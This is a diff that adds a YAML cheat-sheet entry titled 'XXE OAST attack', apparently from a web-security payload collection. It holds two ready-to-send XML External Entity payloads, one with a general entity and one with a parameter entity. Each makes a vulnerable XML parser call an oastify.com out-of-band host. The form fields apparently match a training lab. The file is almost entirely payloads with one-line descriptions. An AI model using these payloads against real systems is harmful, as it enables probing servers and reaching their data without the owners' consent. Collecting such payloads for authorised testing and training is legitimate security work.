@@ -1,0 +1,21 @@
+name: XXE OAST attack
+description:
+commands:
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://il7x2chwkv9xg2k75cd8do2ft6zxnvbk.oastify.com"> ]>
+      <stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
+    description: OAST with custom entities
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://wyybfquax9mbtgxliqqmq2ft6kcb0do2.oastify.com"> %xxe;]>
+      <stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+    description: OAST with parameter entities
+tags:
+  - xxe
+  - oast
+show:
+links:
+  -
+references:
+  -
